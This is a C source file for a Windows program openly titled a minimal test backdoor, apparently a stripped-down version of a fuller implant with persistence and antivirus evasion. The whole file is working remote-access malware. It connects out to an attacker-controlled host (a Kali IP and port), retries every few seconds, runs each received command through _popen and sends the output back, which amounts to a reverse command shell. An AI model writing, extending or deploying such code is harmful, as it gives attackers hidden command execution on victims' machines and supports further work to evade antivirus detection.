// ===================================================================
// MemoryRift - MINIMAL TEST BACKDOOR (no persistence, no junk, no obfuscation)
// Purpose: Test if basic TCP connect + command execution works
// If THIS works but backdoor3o.c doesn't, the issue is in persistence/junk/AV
// ===================================================================

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

#define BUFFER_SIZE 4096

// <<<< CHANGE THIS TO YOUR KALI IP >>>>
char ip_plain[] = "192.168.56.104";
int  port       = 50005;

void write_log(const char* msg) {
    char path[MAX_PATH] = {0};
    GetTempPathA(MAX_PATH, path);
    strcat(path, "test_backdoor.log");
    FILE* f = fopen(path, "a");
    if (f) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        fprintf(f, "[%02d:%02d:%02d] %s\n", st.wHour, st.wMinute, st.wSecond, msg);
        fclose(f);
    }
}

void CmdShell(SOCKET sock) {
    char buffer[BUFFER_SIZE];
    char logbuf[BUFFER_SIZE];

    write_log("CmdShell started - waiting for commands");

    while (1) {
        memset(buffer, 0, BUFFER_SIZE);
        int bytes = recv(sock, buffer, BUFFER_SIZE - 1, 0);
        if (bytes <= 0) {
            write_log("recv returned <= 0, connection lost");
            break;
        }
        buffer[bytes] = '\0';

        // Strip trailing newlines
        while (bytes > 0 && (buffer[bytes-1] == '\n' || buffer[bytes-1] == '\r')) {
            buffer[--bytes] = '\0';
        }

        sprintf(logbuf, "Received command: [%s]", buffer);
        write_log(logbuf);

        if (strcmp(buffer, "q") == 0) {
            write_log("Quit command received");
            break;
        }
        else if (strncmp(buffer, "cd ", 3) == 0) {
            SetCurrentDirectoryA(buffer + 3);
            write_log("Changed directory");
        }
        else if (strcmp(buffer, "screenshot") == 0) {
            // Send a tiny fake response for testing
            send(sock, "54\n", 3, 0);
            Sleep(200);
            // Minimal 54-byte BMP header
            char fakebmp[54] = {0};
            fakebmp[0] = 'B'; fakebmp[1] = 'M';
            *(int*)(fakebmp+2) = 54;
            *(int*)(fakebmp+10) = 54;
            send(sock, fakebmp, 54, 0);
            write_log("Sent fake screenshot");
            continue; // no trailing \n
        }
        else {
            // Execute command with _popen
            sprintf(logbuf, "Executing: [%s]", buffer);
            write_log(logbuf);

            FILE* fp = _popen(buffer, "r");
            if (fp) {
                char output[BUFFER_SIZE];
                int total_sent = 0;
                while (fgets(output, sizeof(output), fp)) {
                    send(sock, output, strlen(output), 0);
                    total_sent += strlen(output);
                }
                _pclose(fp);
                sprintf(logbuf, "Sent %d bytes of output", total_sent);
                write_log(logbuf);
            } else {
                send(sock, "Command failed\n", 15, 0);
                write_log("_popen failed");
            }
        }
        // Send empty line as terminator
        send(sock, "\n", 1, 0);
        write_log("Sent terminator");
    }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
    char logbuf[512];

    write_log("========================================");
    write_log("TEST BACKDOOR STARTED");
    sprintf(logbuf, "Target: %s:%d", ip_plain, port);
    write_log(logbuf);

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        write_log("WSAStartup FAILED!");
        return 1;
    }
    write_log("WSAStartup OK");

    while (1) {
        write_log("Creating socket...");
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            write_log("socket() FAILED");
            Sleep(5000);
            continue;
        }
        write_log("Socket created OK");

        struct sockaddr_in server = {0};
        server.sin_family = AF_INET;
        server.sin_addr.s_addr = inet_addr(ip_plain);
        server.sin_port = htons(port);

        sprintf(logbuf, "Connecting to %s:%d...", ip_plain, port);
        write_log(logbuf);

        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            int err = WSAGetLastError();
            sprintf(logbuf, "connect() FAILED - WSA error %d - retrying in 5s", err);
            write_log(logbuf);
            closesocket(sock);
            Sleep(5000);
            continue;
        }

        write_log("CONNECTED SUCCESSFULLY!");

        // Send banner with newline
        char* banner = "TestBackdoor-Connected\n";
        send(sock, banner, strlen(banner), 0);
        write_log("Banner sent");

        CmdShell(sock);

        write_log("Connection lost - will reconnect");
        closesocket(sock);
        Sleep(5000);
    }

    WSACleanup();
    return 0;
}
